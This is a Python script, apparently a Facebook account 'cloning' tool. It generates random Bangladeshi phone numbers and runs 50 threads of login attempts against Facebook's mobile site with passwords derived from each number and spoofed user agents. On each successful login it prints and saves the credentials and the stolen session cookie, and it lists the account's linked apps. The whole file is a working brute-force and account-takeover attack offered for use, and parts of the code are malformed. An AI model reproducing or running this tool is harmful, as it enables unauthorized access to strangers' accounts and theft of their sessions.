# create by saiful
#king saiful
#gst saiful
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[ðŸ¤–] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        else:
            print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[ðŸ¤–] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
os.system("clear")
jalan(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[1;32mcreate \033[0;34mby saiful \033[0;32mvai...............')
jalan(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[1;32mupdate \033[0;32mdone.............')
jalan(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[1;32mFOLLOW MY FB ACCOUNT............')
os.system('xdg-open https://www.facebook.com/gangstter.ceo?mibextid=ZbWKwL')
logo =("""\033[0;92m
\033[1;32m  ███████╗ █████╗ ██╗███████╗██╗   ██╗██╗     
\033[93;1m  ██╔════╝██╔══██╗██║██╔════ ██║   ██║██║     
\033[93;1m  ███████╗███████║██║█████╗  ██║   ██║██║     
\033[93;1m  ╚════██║██╔══██║██║██╔══╝  ██║   ██║██║     
\033[1;32m  ███████║██║  ██║██║██║     ╚██████╔╝███████╗
\033[1;32m  ╚══════╝╚═╝  ╚═╝╚═╝╚═╝      ╚═════╝ ╚══════╝                                                                                               
  
\033[1;37m╔\033[1;36mGST\033[93;1m═══════════════════\033[1;36mGST✯𝐓𝐄𝐀𝐌\033[93;1m═════════════════\033[1;36m𝐆𝐒𝐓\033[1;37m╗
\033[1;31m│\033[1;37m☞  \033[1;32m𝗔𝗨𝗧𝗛𝗘𝗥     \033[1;31m➟   \033[1;32m𝐌𝐃 𝐒𝐀𝐈𝐅𝐔𝐋 𝐈𝐒𝐋𝐀𝐌	           \033[1;31m│
\033[1;31m│\033[1;37m☞  \033[1;32m𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞   \033[1;31m➟   \033[1;32m𝐒𝐀𝐈𝐅𝐔𝐋 𝐕𝐀𝐈 (𝐁𝐋𝐀𝐍𝐊) 	           \033[1;31m│
\033[1;31m│\033[1;37m☞  \033[1;32m𝗚𝗜𝗧𝗛𝗨𝗕    \033[1;31m ➟  \033[1;32m 𝐒𝐀𝐈𝐅𝐔𝐋-𝐆𝐒𝐓𝟒𝟐𝟎                  \033[1;31m │
\033[1;31m│\033[1;37m☞  \033[1;32m𝗬𝗢𝗨𝗧𝗨𝗕𝗘   \033[1;31m ➟   \033[1;32m𝐒𝐑.𝐒𝐀𝐈𝐅𝐔𝐋 𝐕𝐀𝐈                \033[1;31m   │
\033[1;31m│\033[1;37m☞  \033[1;32m𝗩𝗘𝗥𝗦𝗜𝗢𝗡   \033[1;31m ➟   \033[1;32m𝟑.𝟗.𝟎                        \033[1;31m   │
\033[1;31m│\033[1;37m☞  \033[1;32m𝗚𝗥𝗢𝗨𝗣\033[1;31m : \033[1;32m𝐒𝐀𝐈𝐅𝐔𝐋-𝐇𝐀𝐂𝐊𝐄𝐑𝟒𝟐𝟎 	     \033[1;37m {\033[1;36mGST\033[1;37m}        \033[1;31m│
\033[1;37m╚\033[1;36mGST\033[93;1m══════\033[41m\033[1;37m[ 𓆩.𝐆𝐄𝐒𝐓..𓆪 𓆩𝐒𝐘𝐁𝐄𝐑𓆪  𓆩.𝐓𝐄𝐄𝐌.𓆪 ]\033[93;1m══════\033[1;36m𝐆𝐒𝐓\033[1;37m╝\033[93;1m

\033[93;1m●\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\033[93;1m❴\033[47m\033[1;30m𝐒𝐀𝐈𝐅𝐔𝐋 𝐕𝐀𝐈\033[40m\033[00m\033[93;1m❵\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═\033[93;1m● 
 \033[1;91m[\033[1;97m✔️\033[1;91m]\033[1;32m 𝐆𝐒𝐓.....
 \033[1;91m[\033[1;97m✔️\033[1;91m]\033[1;32m 𝐒𝐀𝐈𝐅𝐔𝐋 𝐕𝐀𝐈....
 \033[1;91m[\033[1;97m✔️\033[1;91m]\033[1;32m 𝐒𝐀𝐈𝐅𝐔𝐋-𝐆𝐒𝐓....
 \033[1;91m[\033[1;97m✔️\033[1;91m]\033[1;32m 𝐎𝐍𝐋𝐘 𝐑𝐄𝐀𝐍𝐃𝐎𝐌....
\033[93;1m●\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\033[93;1m❴\033[47m\033[1;30m𝐒𝐀𝐈𝐅𝐔𝐋 𝐕𝐀𝐈\033[40m\033[00m\033[93;1m❵\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═\033[93;1m●\n """) 
loop = 0
oks = []
cps = []

def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ugen2=['Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36']
ugen=['Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5']
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)  
# APK CHECK
def hoga_check():
  uuid =  str(os.geteuid()) + str(os.getlogin()) 
  id = "𝐒𝐀𝐈𝐅𝐔𝐋 𝐕𝐀𝐈-X-x0x0x" + "|".join(uuid)
  os.system("clear")
  print(logo)
  print("\033[38;5;46m  ❥▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃❦")
  print("\x1b[1;92m  ➠  𝐘𝐎𝐔𝐑 𝐊𝐄𝐘 𝐈𝐒\033[38;5;46m : "+id) 
  try: 
    httpCaht = requests.get("https://github.com/SAIFUL-GST420/approval.txt/blob/main/Approval.txt").text 
    if id in httpCaht: 
      jalan("\x1b[1;96m  ➠   𝐘𝐎𝐔𝐑 𝐊𝐄𝐘 𝐒𝐓𝐀𝐓𝐔𝐒: 𝐀𝐂𝐓𝐈𝐕𝐄  \033[97;1m  ✔ ") 
      msg = str(os.geteuid()) 
      time.sleep(0.3) 
      pass 
    else: 
      jalan("\x1b[38;5;248m  ➠  𝐘𝐎𝐔𝐑 𝐊𝐄𝐘 𝐈𝐒 𝐍𝐎𝐓 𝐀𝐂𝐓𝐈𝐕𝐄\33[97;1m ✘") 
      jalan("\x1b[38;5;208m  ➠  𝐂𝐎𝐏𝐘 𝐘𝐎𝐔𝐑 𝐊𝐄𝐘 𝐒𝐄𝐍𝐓 ??𝐔𝐓𝐇𝐎??") 
      time.sleep(1) 
      sys.exit() 
  except: 
    sys.exit() 
    if name == '__main__': 
     print(logo) 
     hoga_check()
hoga_check()	
def xxr():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m Example>: \033[38;5;45m019,\033[38;5;46m017,\033[38;5;195m018{x}')
    print(" \033[93;1m●\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\033[93;1m❴\033[47m\033[1;30mSAIFUL VAI\033[40m\033[00m\033[93;1m❵\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═\033[93;1m●\n")
    rk1 = '0171'
    rk2 = '0172'
    rk3 = '0174'
    rk4 = '017'
    code = random.choice([rk1,rk2,rk3])                       #input(f' [{xr}â– {x}] Choose : ')
    os.system('clear')
    print(logo)
    limit = int(input(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m EXAMPLE : \033[38;5;195m10000, \033[38;5;45m20000, \033[38;5;46m50000  \n \033[1;93m××××××××××××××××\033[1;93m×××××××××××××××\033[1;93m×××××××××××××××××\n \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m PUT CLONING LIMIT:\033[38;5;46m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = 0
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = input(f"[*] Enter Password {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print('\033[93;1m●\x1b[1;92m▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃\033[47m\x1b[1;92m𝐆𝐒𝐓\033[40m\033[00m\033[93;1m▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃\033[93;1m●')
        jalan(f' \033[38;5;196m[\033[38;5;195m✔️\033[38;5;196m]\x1b[1;92m𝐂𝐇𝐎𝐎𝐒𝐄 𝐘𝐎𝐔𝐑 𝐂𝐎𝐎𝐃𝐄 : 017')
        jalan(f' \033[38;5;196m[\033[38;5;195m✔️\033[38;5;196m]\x1b[1;92m𝐘𝐎𝐔𝐑 𝐓𝐎𝐓𝐀𝐋 𝐈𝐃𝐒 : \033[38;5;46m'+tl)
        jalan(f' \033[38;5;196m[\033[38;5;195m✔️\033[38;5;196m]\x1b[1;92m𝐔𝐬𝐞𝐫 𝐚𝐠𝐞𝐧𝐭 : 20000')
        jalan(f' \033[38;5;196m[\033[38;5;195m✔️\033[38;5;196m]\x1b[1;92m𝐦𝐨𝐛𝐢𝐥𝐞 𝐝𝐚𝐭𝐚 + 𝐰𝐢𝐟𝐢 𝐨𝐧')
        jalan(f' \033[38;5;196m[\033[38;5;195m✔️\033[38;5;196m]\x1b[1;92m𝐓𝐡𝐞 𝐩𝐫𝐨𝐜𝐞𝐬𝐬 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐬𝐭𝐚𝐫𝐭𝐞𝐝')
        jalan(f' \033[38;5;196m[\033[38;5;195m✔️\033[38;5;196m]\x1b[1;92m𝐮𝐬𝐞 𝐚𝐢𝐫𝐩𝐥𝐚𝐧𝐞 𝐦𝐨𝐝𝐞 𝐢𝐟 𝐨𝐤 𝐢𝐝𝐬')
        jalan(f' \033[38;5;196m[\033[38;5;195m✔️\033[38;5;196m]\x1b[1;92m𝐒𝐀𝐈𝐅𝐔𝐋 𝐎𝐍 𝐅𝐈𝐑𝐄')
        print('\033[93;1m●\x1b[1;92m▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\033[47m\x1b[1;92m𝐆𝐒𝐓\033[40m\033[00m\033[93;1m▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\033[93;1m●')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n \033[1;93m××××××××××××××××\033[1;93m×××××××××××××××\033[1;93m×××××××××××××××××")
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',  
		   "method": 'GET',
 		   "scheme": 'https',
 		    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
		     'accept-language': 'en-ZA,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
		     'cache-control': 'max-age=0',
		     'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
  		   'sec-ch-ua-mobile': '?1',
		     'sec-ch-ua-platform': '"Android"',
		     'sec-fetch-dest': 'document',
		     'sec-fetch-mode': 'navigate',
 		    'sec-fetch-site': 'none',
		     'sec-fetch-user': '?1',
  		   'upgrade-insecure-requests': '1',
 		    'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]               
                print('\r\r \033[38;5;196m[\033[38;5;45m𝗦𝗔𝗜𝗙𝗨𝗟-𝗢𝗞🔥\033[38;5;196m] \033[38;5;46m'+uid+'\033[38;5;196m | \033[38;5;46m' +ps+    '  \n\033[38;5;196m[\033[0;93m[\033[38;5;46m𝗖𝗢𝗢𝗞𝗜𝗘-🤖\033[38;5;45m] = \x1b[1;92m'+coki+  '  ''  \x1b[1;92m')
                cek_apk(session,coki)
                open('/sdcard/𝗦𝗔𝗜𝗙𝗨𝗟-𝗢𝗞.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\x1b[1;91m[𝗦𝗔𝗜𝗙𝗨𝗟-𝗖𝗣] ' +uid+'\033[38;5;196m | \x1b[1;91m' +ps+   '')              
                #open('/sdcard/saiful-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r[\033[1;92m𝗦𝗔𝗜𝗙𝗨𝗟-𝐕𝐀𝐈\033[1;97m] > [%s/%s] > [𝗢𝗞\033[1;97m:-\033[1;92m%s\033[1;97m] \r'%(loop,tl,len(oks))),
         
        sys.stdout.flush()
    except:
        pass

xxr()